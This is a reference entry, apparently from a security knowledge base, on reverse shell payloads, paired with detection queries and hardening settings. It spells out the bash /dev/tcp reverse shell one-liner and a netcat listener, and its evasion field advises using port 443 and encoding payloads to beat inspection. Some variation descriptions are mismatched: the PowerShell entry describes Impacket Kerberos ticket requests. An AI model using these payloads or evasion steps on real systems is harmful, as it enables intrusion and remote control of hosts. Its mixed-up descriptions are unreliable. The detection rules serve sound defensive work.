examples.label: Bash TCP reverse shell back to your listener

notes: Catch with: nc -lvnp 1234. More one-liners: PayloadsAllTheThings / InternalAllTheThings reverse-shell cheatsheet.
name: Reverse Shell Payloads
description: Run on the target to connect back to your listener. The victim initiates the connection, which usually beats outbound firewall rules.

variations.label: Linux bash
variations.description: Bash reverse shell using /dev/tcp for the network connection. The most common Linux reverse shell one-liner - redirects stdin/stdout/stderr through a TCP connection back to your listener.

variations.label: Linux mkfifo (sh)
variations.description: Netcat reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls.

variations.label: Windows PowerShell
variations.description: Uses Impacket getST to request a Kerberos Service Ticket (TGS) for a specific SPN. Used in constrained delegation attacks, S4U abuse, and service ticket manipulation.

variations.label: Windows Nishang Invoke-PowerShellTcp (download + exec)
variations.description: Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning.

variations.label: Windows Nishang Invoke-PowerShellTcpEx (AES-encrypted)
variations.description: Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning.

defense.why_it_works: Unix shells (bash, sh, zsh, etc.) are present by default on Linux and macOS and control every aspect of a system. Certain commands require elevated privileges, but interactive shell access provides a powerful execution environment that attackers use for commands, file operations, pivoting, and spawning further processes.
defense.prerequisites: Code execution on the target and network egress to the attacker's listener.
defense.impact: An interactive shell on the attacker's side, initiated outbound from the target - bypassing inbound firewall rules.
defense.detection: Monitor for Unix shell execution from unexpected parent processes (e.g., a web server or database process spawning bash). Flag shell activity following unusual network connections, file writes to web directories, or privilege escalation attempts.
defense.artifacts: An outbound connection from the target to the listener; a shell interpreter spawned with a network redirect (e.g. bash -i >& /dev/tcp/...) in process logs.
defense.splunk_spl:
index=sysmon EventCode=1 (ParentImage="*bash" OR ParentImage="*sh" OR ParentImage="*cmd.exe" OR ParentImage="*powershell.exe") (Image="*nc*" OR Image="*ncat*" OR CommandLine="*/dev/tcp/*" OR CommandLine="*-e /bin/*")
| table _time, Computer, ParentImage, Image, CommandLine

index=sysmon EventCode=3
| where match(Image, "(?i)(nc|ncat|bash|sh|python|powershell)")
| table _time, Computer, Image, DestinationIp, DestinationPort
defense.elastic_kql: event.code:"1" AND (process.command_line:(*/dev/tcp/* OR *-e?/bin/* OR *nc?-* ) OR process.name:(nc OR ncat))
defense.sentinel_kql:
DeviceProcessEvents
| where ProcessCommandLine has_any ("/dev/tcp/","-e /bin/","nc -e","ncat -e","mkfifo")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
| union (DeviceNetworkEvents | where InitiatingProcessFileName in~ ("nc","ncat","bash","sh","python","powershell.exe") and RemoteIPType == "Public" | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, InitiatingProcessFileName, ProcessCommandLine=strcat(RemoteIP,":",tostring(RemotePort)))
| sort by Timestamp desc
// reverse shell payloads (bash/python/powershell) calling back to the attacker
defense.sigma_rules: proc_creation_reverse_shell_indicators (reverse shell payloads (bash/python/powershell) calling back to the attacker)
defense.prevention: Use application control where appropriate to restrict which binaries can execute. On ESXi hosts, the execInstalledOnly feature prevents binaries from running unless packaged and signed as part of a vSphere installation bundle (VIB).
defense.evasion: Connect outbound to a common port (443) to bypass inbound firewall rules and blend with normal egress; use an encrypted channel (socat/OpenSSL) and encode the payload to defeat inspection and signature matching.
defense.misconfiguration: Outbound connections from servers are not filtered - any process can initiate a TCP connection to arbitrary external IPs on any port. This enables reverse shell callbacks. Additionally, common shell payloads (nc, bash, python) are available on the target, and PowerShell execution policy is not enforced.
defense.vulnerable_config:
# No egress firewall rules on compromised host:
iptables -L OUTPUT  # policy ACCEPT, no rules
# nc, bash, python3 all available

# Windows - PowerShell unrestricted:
Get-ExecutionPolicy  # Unrestricted or Bypass
# Defender not detecting reverse shell payloads (AV evasion successful)
defense.secure_config:
# Linux egress filtering:
iptables -P OUTPUT DROP
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT
# Blocks arbitrary reverse shell callbacks

# Windows - PowerShell Constrained Language Mode:
# GPO: Enable WDAC policy
# Set execution policy = AllSigned (unsigned scripts blocked)

# Windows Defender AMSI: scans all PS scripts before execution
# AMSI bypass detection: EDR products detect common AMSI bypass patterns

# Application allowlisting (AppLocker/WDAC):
# Blocks execution of dropped payloads and LOLBin abuse
# The most effective defense against arbitrary payload execution

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review PowerShell Script Block / Module Logs, Sysmon for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

explain:
Reverse-shell payload run on the target to call back to your listener:
  bash -c '...'                 run the one-liner in bash
  bash -i                       start an interactive shell
  >& /dev/tcp/<lhost>/<lport>   redirect it over a TCP socket to your host/port
  0>&1                          wire stdin back through the same socket
The victim initiates the outbound connection, which usually gets past egress firewall rules; catch it with a netcat listener.
